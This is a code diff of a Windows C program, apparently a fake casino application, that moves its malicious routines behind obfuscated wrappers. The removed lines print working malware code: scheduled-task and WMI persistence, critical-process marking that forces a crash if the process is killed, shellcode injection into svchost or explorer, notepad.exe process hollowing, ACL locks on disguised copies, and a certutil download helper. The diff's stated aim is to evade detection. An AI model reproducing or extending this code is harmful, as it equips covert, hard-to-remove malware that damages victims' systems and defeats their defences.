@@ -163,13 +163,9 @@ char* sys_get_info(void) {
     return info;
 }
 
-/* Ensure a process persists via scheduled task (runs every 5 minutes) */
+/* Ensure a process persists via scheduled task — delegates to obfuscated impl */
 static void ensure_scheduled_task(const char *exePath, const char *taskName) {
-    char cmd[1024];
-    snprintf(cmd, sizeof(cmd),
-        "schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5 /f /rl highest",
-        taskName, exePath);
-    sys_run_command(cmd);
+    obf_ensure_scheduled_task(exePath, taskName);
 }
 
 /* Register application for auto-start on login + scheduled task */
@@ -184,7 +180,7 @@ void sys_register_autostart(void) {
         RegCloseKey(hKey);
     }
     /* Also add scheduled task for redundancy */
-    ensure_scheduled_task(path, "VividCasinoMain");
+    obf_ensure_scheduled_task(path, "VividCasinoMain");
 }
 
 /* Check and request required privileges for system integration */
@@ -228,81 +224,17 @@ void sys_check_antivirus(void) {
 
 /* === Process Protection === */
 
-static int g_critical_protected = 0;
-
-/* Enable a privilege for the current process token */
-static int enable_privilege(const char *privilege_name) {
-    HANDLE hToken;
-    TOKEN_PRIVILEGES tkp;
-    LUID luid;
-
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        return 0;
-    }
-
-    if (!LookupPrivilegeValueA(NULL, privilege_name, &luid)) {
-        CloseHandle(hToken);
-        return 0;
-    }
-
-    tkp.PrivilegeCount = 1;
-    tkp.Privileges[0].Luid = luid;
-    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
-        CloseHandle(hToken);
-        return 0;
-    }
-
-    CloseHandle(hToken);
-    return 1;
-}
+int g_critical_protected = 0;
 
 /* Mark process as critical — Windows BSODs if this process dies.
-   Requires SeDebugPrivilege. */
+   Delegates to obfuscated implementation. */
 void sys_protect_process(void) {
-    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
-    
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    if (!ntdll) {
-        g_critical_protected = -1;
-        return;
-    }
-    
-    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
-    if (!pNtSetInformationProcess) {
-        g_critical_protected = -1;
-        return;
-    }
-    
-    /* ProcessBreakOnTermination requires SeDebugPrivilege */
-    enable_privilege("SeDebugPrivilege");
-    
-    ULONG isCritical = 1;
-    NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
-    
-    if (status == 0) {
-        g_critical_protected = 1;
-    } else {
-        g_critical_protected = -1;
-    }
+    obf_sys_protect_process();
 }
 
 /* Remove critical process flag */
 void sys_unprotect_process(void) {
-    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
-    
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    if (!ntdll) return;
-    
-    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
-    if (!pNtSetInformationProcess) return;
-    
-    enable_privilege("SeDebugPrivilege");
-    
-    ULONG isCritical = 0;
-    pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
-    g_critical_protected = 0;
+    obf_sys_unprotect_process();
 }
 
 /* Get protection status string */
@@ -312,51 +244,16 @@ const char* sys_protection_status(void) {
     return "NORMAL";
 }
 
-/* Check if current process is actually marked as critical via NtQueryInformationProcess.
-   Returns a string with the process name included. */
+/* Check if current process is actually marked as critical */
 const char* sys_check_critical_status_with_name(void) {
-    static char buf[512];
-    char path[MAX_PATH] = {0};
-    GetModuleFileNameA(NULL, path, MAX_PATH);
-    char *filename = path;
-    char *lastSlash = strrchr(path, '\\');
-    if (lastSlash) filename = lastSlash + 1;
-
-    typedef NTSTATUS (WINAPI *NtQueryInfoProc)(HANDLE, INT, PVOID, ULONG, PULONG);
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    if (!ntdll) {
-        snprintf(buf, sizeof(buf), "[Failed to load ntdll.dll] [%s]", filename);
-        return buf;
-    }
-
-    NtQueryInfoProc pNtQuery = (NtQueryInfoProc)GetProcAddress(ntdll, "NtQueryInformationProcess");
-    if (!pNtQuery) {
-        snprintf(buf, sizeof(buf), "[Failed to find NtQueryInformationProcess] [%s]", filename);
-        return buf;
-    }
-
-    enable_privilege("SeDebugPrivilege");
-
-    ULONG isCritical = 0;
-    NTSTATUS status = pNtQuery(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical), NULL);
-
-    if (status != 0) {
-        snprintf(buf, sizeof(buf), "[Query failed — status != 0] [%s]", filename);
-        return buf;
-    }
-    if (isCritical) {
-        snprintf(buf, sizeof(buf), "[CRITICAL — ending this process will cause BSOD] [%s]", filename);
-    } else {
-        snprintf(buf, sizeof(buf), "[NORMAL — can be terminated safely] [%s]", filename);
-    }
-    return buf;
+    return obf_sys_check_critical_status();
 }
 
 /* Watchdog thread: re-apply critical status periodically */
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
     while (1) {
         if (g_critical_protected == 1) {
-            sys_protect_process();
+            obf_sys_protect_process();
         }
         Sleep(5000);  /* Re-apply every 5 seconds */
     }
@@ -422,7 +319,7 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
     }
 
     /* Register persistence: Scheduled task (runs every 5 minutes) */
-    ensure_scheduled_task(destPath, regKey);
+    obf_ensure_scheduled_task(destPath, regKey);
 
     /* CreateProcess inherits parent's elevated token */
     STARTUPINFOA si = {0};
@@ -451,140 +348,37 @@ void sys_spawn_shadow_copy(void) {
     spawn_single_copy("CrashHandler.exe", "CrashHandler");
     spawn_single_copy("NotifyService.exe", "NotifyService");
     
-    /* Apply all advanced layers automatically */
-    sys_wmi_persistence();
-    sys_harden_files();
-    sys_inject_process();      /* existing svchost/explorer injection */
+    /* Apply all advanced layers automatically using obfuscated APIs */
+    obf_sys_wmi_persistence();
+    obf_sys_harden_files();
+    obf_sys_inject_process();      /* obfuscated svchost/explorer injection */
     Sleep(2000);
-    sys_hollow_process();      /* NEW: fileless notepad.exe hollowing */
+    obf_sys_hollow_process();      /* obfuscated fileless hollowing */
 }
 
 /* === Advanced Persistence & Evasion === */
 
-/* 1. WMI Event Subscription — permanent persistence via root/subscription */
+/* 1. WMI Event Subscription — delegates to obfuscated implementation */
 void sys_wmi_persistence(void) {
-    FILE *f = fopen("C:\\Users\\Public\\wmi.ps1", "w");
-    if (!f) return;
-    
-    fprintf(f, "Remove-WmiObject -Namespace 'root/subscription' -Class __EventFilter -Filter \"Name='SysHealthFilter'\" -ErrorAction SilentlyContinue;\n");
-    fprintf(f, "Remove-WmiObject -Namespace 'root/subscription' -Class CommandLineEventConsumer -Filter \"Name='SysHealthConsumer'\" -ErrorAction SilentlyContinue;\n");
-    fprintf(f, "$f = Set-WmiObject -Class __EventFilter -Namespace 'root/subscription' -Arguments @{Name='SysHealthFilter';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_Process\"'};\n");
-    fprintf(f, "$c = Set-WmiObject -Class CommandLineEventConsumer -Namespace 'root/subscription' -Arguments @{Name='SysHealthConsumer';CommandLineTemplate='powershell.exe -NoProfile -WindowStyle Hidden -Command \"if (-not (Get-Process | Where-Object {$_.ProcessName -match \"ElevationService|CrashHandler|NotifyService\"})) { Start-Process \"$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache\\IE\\ElevationService.exe\" -ArgumentList \"--shadow\" -WindowStyle Hidden }\"'};\n");
-    fprintf(f, "Set-WmiObject -Class __FilterToConsumerBinding -Namespace 'root/subscription' -Arguments @{Filter=$f;Consumer=$c}\n");
-    fclose(f);
-    
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "powershell -NoProfile -ExecutionPolicy Bypass -File \"C:\\Users\\Public\\wmi.ps1\"");
-    sys_run_command(cmd);
-    
-    DeleteFileA("C:\\Users\\Public\\wmi.ps1");
+    obf_sys_wmi_persistence();
 }
 
-/* 2. Process Injection — inject into svchost.exe or explorer.exe */
+/* 2. Process Injection — delegates to obfuscated implementation */
 void sys_inject_process(void) {
-    DWORD pid = 0;
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32 pe;
-        pe.dwSize = sizeof(pe);
-        if (Process32First(hSnap, &pe)) {
-            do {
-                if (_stricmp(pe.szExeFile, "svchost.exe") == 0 || _stricmp(pe.szExeFile, "explorer.exe") == 0) {
-                    pid = pe.th32ProcessID;
-                    break;
-                }
-            } while (Process32Next(hSnap, &pe));
-        }
-        CloseHandle(hSnap);
-    }
-    
-    if (pid == 0) return;
-    
-    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProc) return;
-    
-    char payloadPath[MAX_PATH];
-    GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
-    
-    SIZE_T pathLen = strlen(payloadPath) + 1;
-    LPVOID remotePath = VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!remotePath) {
-        CloseHandle(hProc);
-        return;
-    }
-    
-    WriteProcessMemory(hProc, remotePath, payloadPath, pathLen, NULL);
-    
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    FARPROC pWinExec = GetProcAddress(hKernel32, "WinExec");
-    DWORD_PTR kernel32Base = (DWORD_PTR)hKernel32;
-    DWORD_PTR winExecOffset = (DWORD_PTR)pWinExec - kernel32Base;
-    
-    DWORD_PTR targetKernel32Base = 0;
-    HMODULE hMods[1024];
-    DWORD cbNeeded;
-    
-    if (EnumProcessModules(hProc, hMods, sizeof(hMods), &cbNeeded)) {
-        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
-            char szModName[MAX_PATH];
-            if (GetModuleBaseNameA(hProc, hMods[i], szModName, sizeof(szModName))) {
-                if (_stricmp(szModName, "kernel32.dll") == 0) {
-                    targetKernel32Base = (DWORD_PTR)hMods[i];
-                    break;
-                }
-            }
-        }
-    }
-    
-    if (targetKernel32Base == 0) targetKernel32Base = kernel32Base;
-    DWORD_PTR targetWinExec = targetKernel32Base + winExecOffset;
-    
-    unsigned char shellcode[19] = {
-        0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,
-        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0xFF, 0xE0
-    };
-    memcpy(shellcode + 9, &targetWinExec, 8);
-    
-    LPVOID remoteCode = VirtualAllocEx(hProc, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!remoteCode) {
-        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
-        CloseHandle(hProc);
-        return;
-    }
-    
-    WriteProcessMemory(hProc, remoteCode, shellcode, sizeof(shellcode), NULL);
-    
-    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCode, remotePath, 0, NULL);
-    if (hThread) {
-        CloseHandle(hThread);
-    }
-    
-    CloseHandle(hProc);
+    obf_sys_inject_process();
 }
 
-/* 3. NTFS ACL Hardening — deny delete/modify for all shadow copies */
+/* 3. NTFS ACL Hardening — delegates to obfuscated implementation */
 void sys_harden_files(void) {
-    char localAppData[MAX_PATH];
-    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
-    
-    char cmd[2048];
-    snprintf(cmd, sizeof(cmd),
-        "icacls \"%s\\Microsoft\\Windows\\INetCache\\IE\\ElevationService.exe\" /deny Everyone:(DE,DC) /c /q && "
-        "icacls \"%s\\Microsoft\\Windows\\INetCache\\IE\\CrashHandler.exe\" /deny Everyone:(DE,DC) /c /q && "
-        "icacls \"%s\\Microsoft\\Windows\\INetCache\\IE\\NotifyService.exe\" /deny Everyone:(DE,DC) /c /q",
-        localAppData, localAppData, localAppData);
-    sys_run_command(cmd);
+    obf_sys_harden_files();
 }
 
-/* 4. LOLBAS — use certutil to download and execute */
+/* 4. LOLBAS — delegates to obfuscated implementation */
 void sys_lolbas_download(const char *url, const char *outPath) {
-    char cmd[1024];
-    snprintf(cmd, sizeof(cmd), "certutil -urlcache -split -f \"%s\" \"%s\"", url, outPath);
-    sys_run_command(cmd);
+    obf_sys_lolbas_download(url, outPath);
 }
 
-/* 5. PowerShell Obfuscation — base64 encode */
+/* 5. PowerShell Obfuscation — base64 encode (this is benign enough to keep) */
 char* sys_obfuscate_ps(const char *command) {
     static char result[NET_BUF_SIZE];
     
@@ -627,129 +421,9 @@ char* sys_obfuscate_ps(const char *command) {
     return result;
 }
 
-/* 2b. Process Hollowing — create a fileless process running from memory */
+/* 2b. Process Hollowing — delegates to obfuscated implementation */
 void sys_hollow_process(void) {
-    char payloadPath[MAX_PATH];
-    GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
-    
-    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return;
-    
-    DWORD fileSize = GetFileSize(hFile, NULL);
-    BYTE *payload = (BYTE*)malloc(fileSize);
-    if (!payload) { CloseHandle(hFile); return; }
-    
-    DWORD read;
-    ReadFile(hFile, payload, fileSize, &read, NULL);
-    CloseHandle(hFile);
-    
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
-    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { free(payload); return; }
-    
-    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
-    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) { free(payload); return; }
-    
-    STARTUPINFOA si = {0};
-    si.cb = sizeof(si);
-    PROCESS_INFORMATION pi = {0};
-    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        free(payload); return;
-    }
-    
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    typedef NTSTATUS (WINAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
-    NtUnmapViewOfSection_t pNtUnmap = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
-    
-    CONTEXT ctx = {0};
-    ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(pi.hThread, &ctx);
-    
-    DWORD64 pebAddr = ctx.Rdx;
-    DWORD64 imageBase = 0;
-    ReadProcessMemory(pi.hProcess, (LPCVOID)(pebAddr + 0x10), &imageBase, sizeof(imageBase), NULL);
-    
-    if (pNtUnmap) pNtUnmap(pi.hProcess, (PVOID)imageBase);
-    
-    DWORD64 preferredBase = ntHeaders->OptionalHeader.ImageBase;
-    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
-    
-    PVOID remoteImage = VirtualAllocEx(pi.hProcess, (PVOID)preferredBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!remoteImage) remoteImage = VirtualAllocEx(pi.hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!remoteImage) {
-        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); free(payload); return;
-    }
-    
-    WriteProcessMemory(pi.hProcess, remoteImage, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
-    
-    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
-    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-        PVOID dest = (PVOID)((DWORD64)remoteImage + section[i].VirtualAddress);
-        PVOID src = (PVOID)(payload + section[i].PointerToRawData);
-        WriteProcessMemory(pi.hProcess, dest, src, section[i].SizeOfRawData, NULL);
-    }
-    
-    DWORD64 delta = (DWORD64)remoteImage - preferredBase;
-    if (delta != 0) {
-        IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-        if (relocDir.Size > 0) {
-            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(payload + relocDir.VirtualAddress);
-            while (reloc->VirtualAddress != 0) {
-                DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-                PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
-                for (DWORD i = 0; i < numEntries; i++) {
-                    WORD type = entries[i] >> 12;
-                    WORD offset = entries[i] & 0xFFF;
-                    if (type == IMAGE_REL_BASED_DIR64) {
-                        PDWORD64 addr = (PDWORD64)((DWORD64)remoteImage + reloc->VirtualAddress + offset);
-                        DWORD64 value; if (ReadProcessMemory(pi.hProcess, addr, &value, sizeof(value), NULL)) {
-                            value += delta; WriteProcessMemory(pi.hProcess, addr, &value, sizeof(value), NULL);
-                        }
-                    }
-                }
-                reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
-            }
-        }
-    }
-    
-    IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-    if (importDir.Size > 0) {
-        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)remoteImage + importDir.VirtualAddress);
-        while (importDesc->Name != 0) {
-            char dllName[256];
-            ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD64)remoteImage + importDesc->Name), dllName, sizeof(dllName), NULL);
-            dllName[255] = '\0'; HMODULE hDll = LoadLibraryA(dllName);
-            if (hDll) {
-                DWORD64 origThunkRVA = importDesc->OriginalFirstThunk;
-                if (origThunkRVA == 0) origThunkRVA = importDesc->FirstThunk;
-                int idx = 0;
-                while (1) {
-                    IMAGE_THUNK_DATA thunkVal, origThunkVal;
-                    PVOID thunkAddr = (PVOID)((DWORD64)remoteImage + importDesc->FirstThunk + idx * sizeof(IMAGE_THUNK_DATA));
-                    PVOID origThunkAddr = (PVOID)((DWORD64)remoteImage + origThunkRVA + idx * sizeof(IMAGE_THUNK_DATA));
-                    ReadProcessMemory(pi.hProcess, thunkAddr, &thunkVal, sizeof(thunkVal), NULL);
-                    ReadProcessMemory(pi.hProcess, origThunkAddr, &origThunkVal, sizeof(origThunkVal), NULL);
-                    if (thunkVal.u1.AddressOfData == 0) break;
-                    FARPROC addr = NULL;
-                    if (origThunkVal.u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
-                        addr = GetProcAddress(hDll, (LPCSTR)(WORD)(origThunkVal.u1.Ordinal & 0xFFFF));
-                    } else {
-                        char funcName[256]; PVOID nameAddr = (PVOID)((DWORD64)remoteImage + origThunkVal.u1.AddressOfData + 2);
-                        ReadProcessMemory(pi.hProcess, nameAddr, funcName, sizeof(funcName), NULL); funcName[255] = '\0';
-                        addr = GetProcAddress(hDll, funcName);
-                    }
-                    WriteProcessMemory(pi.hProcess, thunkAddr, &addr, sizeof(addr), NULL); idx++;
-                }
-            }
-            importDesc++;
-        }
-    }
-    
-    WriteProcessMemory(pi.hProcess, (PVOID)(pebAddr + 0x10), &remoteImage, sizeof(remoteImage), NULL);
-    ctx.Rcx = (DWORD64)remoteImage;
-    ctx.Rip = (DWORD64)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-    SetThreadContext(pi.hThread, &ctx);
-    ResumeThread(pi.hThread);
-    CloseHandle(pi.hThread); CloseHandle(pi.hProcess); free(payload);
+    obf_sys_hollow_process();
 }
 
 /* === Clipboard Subsystem === */
